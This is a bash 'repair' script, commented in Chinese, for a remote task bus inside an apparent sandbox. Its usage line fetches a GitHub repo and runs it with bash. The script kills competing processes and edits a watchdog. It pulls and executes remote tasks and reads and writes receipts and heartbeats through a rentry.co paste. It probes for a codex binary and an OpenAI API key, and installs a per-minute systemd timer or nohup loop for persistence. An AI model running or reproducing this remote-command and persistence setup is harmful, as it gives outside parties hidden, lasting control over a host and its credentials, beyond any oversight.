#!/bin/bash
# repair.sh v3 —修复 git 任务通道：清理坏钩子 + 杀并发 + 重排无回执任务 + 排空队列 + 探测 codex + 装独立定时器
# 幂等，可反复运行。用法（沙箱内）：
#   rm -rf /tmp/gt && git clone -q --depth 1 https://github.com/1432151545/newapi-tasks.git /tmp/gt && bash /tmp/gt/repair.sh 2>&1
set -u
B=${BUS_STATE_DIR:-$HOME/.hermes-gitbus}
W=${BUS_WATCHDOG:-$HOME/workspace/bin/newapi-watchdog.sh}
D=$B/tasks-repo
SLUG=hermes-rx-r6qytd4
REPO=https://github.com/1432151545/newapi-tasks.git
echo "=== repair3 $(date -u +%FT%TZ) host=$(hostname) home=$HOME ==="

echo; echo "== A) 现状证据 =="
echo "--- A1 相关进程 ---"
ps -eo pid,ppid,etime,cmd 2>/dev/null | grep -E 'muse_git_poller|newapi-watchdog|sync_patch' | grep -v grep | head -12 || echo "(none)"
echo "--- A2 poller 副本 ---"
find / -name 'muse_git_poller.py' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -8
echo "--- A3 watchdog 机制行 ---"
grep -n 'sync_patch_from_pointer\|muse_git_poller\|set -u\|while\|sleep' "$W" 2>/dev/null | head -14 || echo "(no watchdog)"
echo "--- A4 gitbus 目录 ---"
ls -la "$B" 2>/dev/null | head -18
echo "--- A5 done 台账 + agent_inbox ---"
cat "$B/git_done.json" 2>/dev/null | head -3; echo
ls -la "$B/agent_inbox" 2>/dev/null || echo "(no agent_inbox)"
echo "--- A6 agent-outbox-report.py ---"
find / -name 'agent-outbox-report*' -not -path '/proc/*' 2>/dev/null | head -3 || true
echo "--- A7 poller log tail(35) ---"
tail -35 "$B/git_poller.log" 2>/dev/null || echo "(no log)"
echo "--- A8 workspace/bin ---"
ls "$HOME/workspace/bin" 2>/dev/null | head -12

echo; echo "== B) 拉最新任务库 =="
if [ -d "$D/.git" ]; then
  git -C "$D" pull -q --ff-only 2>/dev/null || { git -C "$D" fetch -q --depth 1 origin main && git -C "$D" reset -q --hard FETCH_HEAD; }
else
  git clone -q --depth 1 "$REPO" "$D"
fi
echo "head=$(git -C "$D" rev-parse --short HEAD 2>/dev/null) tasks=$(ls "$D/tasks" 2>/dev/null | tr '\n' ' ')"

echo; echo "== C) 清理 watchdog 坏钩子 + 重启（恢复原状）=="
if [ -f "$W" ]; then
  cp -a "$W" "$W.repair3.$(date +%s)"
  python3 - "$W" <<'PY'
import sys
w = sys.argv[1]
L = open(w, encoding='utf-8', errors='replace').read().split('\n')
out = [l for l in L if 'muse_git_poller' not in l]
open(w, 'w', encoding='utf-8').write('\n'.join(out))
print("removed_poller_lines=%d" % (len(L) - len(out)))
PY
  if bash -n "$W"; then echo "watchdog syntax OK"; else
    for f in $(ls -tr "$W".bak.* "$W".repair3.* 2>/dev/null); do cp -a "$f" "$W"; bash -n "$W" && { echo "restored from $f"; break; }; done
  fi
  pkill -f 'newapi-watchdog.sh' 2>/dev/null; sleep 1
  setsid nohup bash "$W" >> "$B/watchdog.out" 2>&1 </dev/null & sleep 2
  echo "watchdog pid=$(pgrep -f newapi-watchdog.sh | tr '\n' ' ')"
fi

echo; echo "== D) 杀并发轮询器 =="
for r in 1 2; do
  for p in $(pgrep -f 'muse_git_poller' 2>/dev/null); do
    echo "kill $p: $(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null | head -c 130)"
    kill -9 "$p" 2>/dev/null
  done
  sleep 1
done

echo; echo "== E) 重排「已完成但无回执」的任务 =="
python3 - "$B" "$SLUG" <<'PY'
import json, sys, os, re, urllib.request, html
B, slug = sys.argv[1], sys.argv[2]
p = os.path.join(B, 'git_done.json')
try: done = json.load(open(p))
except Exception: done = {}
try:
    h = urllib.request.urlopen(urllib.request.Request('https://rentry.co/%s/edit' % slug, headers={'User-Agent': 'Mozilla/5.0'}), timeout=30).read().decode('utf-8', 'replace')
    m = re.search(r'<textarea[^>]*>(.*?)</textarea>', h, re.S)
    t = html.unescape(m.group(1)) if m else ''
except Exception as e:
    t = ''; print('outbox_read_fail', e)
recs = set(re.findall(r'REC\|task=([^|]+)\|', t))
req = [k for k in list(done.keys()) if k not in recs]
for k in req: del done[k]
json.dump(done, open(p, 'w'))
print('receipts=%d requeued=%s' % (len(recs), req or '[]'))
PY

echo; echo "== F) 排空队列（≤8 轮，每轮一个任务）=="
i=0
while [ $i -lt 8 ]; do
  i=$((i + 1)); echo "----- round $i -----"
  timeout 120 python3 "$B/muse_git_poller.py" 2>&1 | tail -10
  sleep 4
done

echo; echo "== G) codex 探测 =="
CB=""
for c in /opt/hatch-image/bin/codex $(command -v codex 2>/dev/null); do
  [ -n "$c" ] && [ -x "$c" ] && { CB=$c; break; }
done
if [ -n "$CB" ]; then
  echo "codex=$CB"
  timeout 25 "$CB" --version 2>&1 | head -2
  echo "--- exec help (head 40) ---"
  timeout 25 "$CB" exec --help 2>&1 | head -40
else
  echo "(codex not found)"
fi
echo "OPENAI_API_KEY_set=$([ -n "${OPENAI_API_KEY:-}" ] && echo yes || echo no)"

echo; echo "== H) 装 systemd 定时器（每分钟，独立于 watchdog）=="
PY=$(command -v python3 || echo /usr/bin/python3)
if [ "$(ps -p 1 -o comm= 2>/dev/null)" = "systemd" ]; then
  cat > /etc/systemd/system/git-task-poller.service <<EOF
[Unit]
Description=Git task poller (newapi-tasks)
[Service]
Type=oneshot
Environment=HOME=$HOME
ExecStart=$PY $B/muse_git_poller.py
EOF
  cat > /etc/systemd/system/git-task-poller.timer <<EOF
[Unit]
Description=Run git task poller every minute
[Timer]
OnBootSec=30s
OnUnitActiveSec=60s
AccuracySec=10s
[Install]
WantedBy=timers.target
EOF
  timeout 30 systemctl daemon-reload 2>&1 | head -2
  timeout 30 systemctl enable --now git-task-poller.timer 2>&1 | head -3
  timeout 20 systemctl start git-task-poller.service 2>&1 | head -2
  sleep 3
  echo "timer=$(timeout 20 systemctl is-active git-task-poller.timer 2>/dev/null) svc=$(timeout 20 systemctl is-active git-task-poller.service 2>/dev/null)"
  timeout 20 systemctl list-timers git-task-poller.timer --no-pager 2>/dev/null | head -4
else
  echo "no systemd -> nohup loop"
  setsid nohup bash -c 'while true; do python3 "$HOME/.hermes-gitbus/muse_git_poller.py" >> "$HOME/.hermes-gitbus/git_poller.log" 2>&1; sleep 60; done' </dev/null >/dev/null 2>&1 &
  sleep 2; echo "loop pids: $(pgrep -f muse_git_poller | tr '\n' ' ')"
fi

echo; echo "== I) rentry 通道跑一轮（心跳 + 处理 rentry 任务）=="
S="$B/sync_patch_from_pointer.sh"
if [ -f "$S" ]; then timeout 300 bash "$S" 2>&1 | tail -12; else echo "(no sync script)"; fi

echo; echo "== J) 回执快照 =="
python3 - "$SLUG" <<'PY'
import re, sys, urllib.request, html
slug = sys.argv[1]
try:
    h = urllib.request.urlopen(urllib.request.Request('https://rentry.co/%s/edit' % slug, headers={'User-Agent': 'Mozilla/5.0'}), timeout=30).read().decode('utf-8', 'replace')
    m = re.search(r'<textarea[^>]*>(.*?)</textarea>', h, re.S)
    t = html.unescape(m.group(1)) if m else ''
except Exception as e:
    t = ''; print('read_fail', e)
for l in t.splitlines():
    if l.startswith('REC|'):
        g = lambda l, k: (re.search(k + r'=([^|]+)', l) or [None, '?'])[1]
        print('REC %-11s exit=%s ts=%s' % (g(l, 'task'), g(l, 'exit'), g(l, 'ts')))
    elif l.startswith('HB|'):
        print('HB  %s' % l[:95])
PY
echo "=== repair3 done ==="